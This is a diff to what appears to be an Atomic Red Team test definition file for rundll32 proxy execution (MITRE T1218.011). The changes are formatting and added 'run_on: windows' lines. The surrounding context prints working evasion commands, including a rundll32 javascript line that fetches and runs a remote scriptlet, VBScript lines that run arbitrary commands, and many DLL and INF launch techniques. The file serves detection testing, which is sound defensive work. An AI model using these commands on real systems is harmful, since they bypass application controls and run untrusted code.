@@ -14,13 +14,16 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
   executor:
     command: |
       rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
     cleanup_command: |
       taskkill /IM notepad.exe /f
     name: command_prompt
+  run_on:
+  - windows
 - name: Rundll32 execute VBscript command
   auto_generated_guid: 638730e7-7aed-43dc-bf8c-8117f805f5bb
   description: |
@@ -38,6 +41,8 @@ atomic_tests:
     command: |
       rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
     name: command_prompt
+  run_on:
+  - windows
 - name: Rundll32 execute VBscript command using Ordinal number
   auto_generated_guid: 32d1cf1b-cbc2-4c09-8d05-07ec5c83a821
   description: |
@@ -55,6 +60,8 @@ atomic_tests:
     command: |
       rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
     name: command_prompt
+  run_on:
+  - windows
 - name: Rundll32 advpack.dll Execution
   auto_generated_guid: d91cae26-7fc1-457b-a854-34c8aad48c89
   description: |
@@ -81,6 +88,8 @@ atomic_tests:
     command: |
       rundll32.exe advpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
     name: command_prompt
+  run_on:
+  - windows
 - name: Rundll32 ieadvpack.dll Execution
   auto_generated_guid: 5e46a58e-cbf6-45ef-a289-ed7754603df9
   description: |
@@ -108,6 +117,8 @@ atomic_tests:
     command: |
       rundll32.exe ieadvpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
     name: command_prompt
+  run_on:
+  - windows
 - name: Rundll32 syssetup.dll Execution
   auto_generated_guid: 41fa324a-3946-401e-bbdd-d7991c628125
   description: |
@@ -134,6 +145,8 @@ atomic_tests:
     command: |
       rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "#{inf_to_execute}"
     name: command_prompt
+  run_on:
+  - windows
 - name: Rundll32 setupapi.dll Execution
   auto_generated_guid: 71d771cd-d6b3-4f34-bc76-a63d47a10b19
   description: |
@@ -160,6 +173,8 @@ atomic_tests:
     command: |
       rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "#{inf_to_execute}"
     name: command_prompt
+  run_on:
+  - windows
 - name: Execution of HTA and VBS Files using Rundll32 and URL.dll
   auto_generated_guid: 22cfde89-befe-4e15-9753-47306b37a6e3
   description: |
@@ -176,6 +191,8 @@ atomic_tests:
       rundll32.exe url.dll,OpenURL "PathToAtomicsFolder\T1218.011\src\index.hta"
       rundll32.exe URL.dll,FileProtocolHandler "PathToAtomicsFolder\T1218.011\src\akteullen.vbs"
     name: command_prompt
+  run_on:
+  - windows
 - name: Launches an executable using Rundll32 and pcwutl.dll
   auto_generated_guid: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
   description: |
@@ -191,6 +208,8 @@ atomic_tests:
     command: |
       rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
     name: command_prompt
+  run_on:
+  - windows
 - name: Execution of non-dll using rundll32.exe
   auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
   description: |
@@ -201,7 +220,8 @@ atomic_tests:
     input_url:
       description: Url to download the DLL
       type: url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      default: 
+        https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
     input_file:
       description: Non-dll file
       type: string
@@ -218,6 +238,8 @@ atomic_tests:
     name: powershell
     command: |
       rundll32.exe #{input_file}, StartW
+  run_on:
+  - windows
 - name: Rundll32 with Ordinal Value
   auto_generated_guid: 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
   description: |
@@ -229,7 +251,8 @@ atomic_tests:
     input_url:
       description: Url to download the DLL
       type: url
-      default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
+      default: 
+        https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
     input_file:
       description: DLL File
       type: string
@@ -246,6 +269,8 @@ atomic_tests:
     name: command_prompt
     command: |
       rundll32.exe "#{input_file}",#2
+  run_on:
+  - windows
 - name: Rundll32 with Control_RunDLL
   auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
   description: |
@@ -256,7 +281,8 @@ atomic_tests:
     input_url:
       description: Url to download the DLL
       type: url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      default: 
+        https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
     input_file:
       description: DLL File
       type: string
@@ -273,6 +299,8 @@ atomic_tests:
     name: command_prompt
     command: |
       rundll32.exe shell32.dll,Control_RunDLL "#{input_file}"
+  run_on:
+  - windows
 - name: Rundll32 with desk.cpl
   auto_generated_guid: 83a95136-a496-423c-81d3-1c6750133917
   description: |
@@ -295,7 +323,8 @@ atomic_tests:
       copy #{exe_to_launch} not_an_scr.scr
       rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
     cleanup_command: del not_an_scr.scr
-
+  run_on:
+  - windows
 - name: Running DLL with .init extension and function
   description: |
     This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file's 'krnl' function is called, it launches a Windows pop-up.
@@ -310,7 +339,8 @@ atomic_tests:
     dll_url:
       description: The URL to the DLL file that must be downloaded
       type: url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init
+      default: 
+        https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init
   dependency_executor_name: powershell
   dependencies:
   - description: The DLL file to be called must exist at the specified location (#{dll_file})
@@ -322,3 +352,5 @@ atomic_tests:
     command: |
       rundll32.exe #{dll_file},krnl
     name: command_prompt
+  run_on:
+  - windows
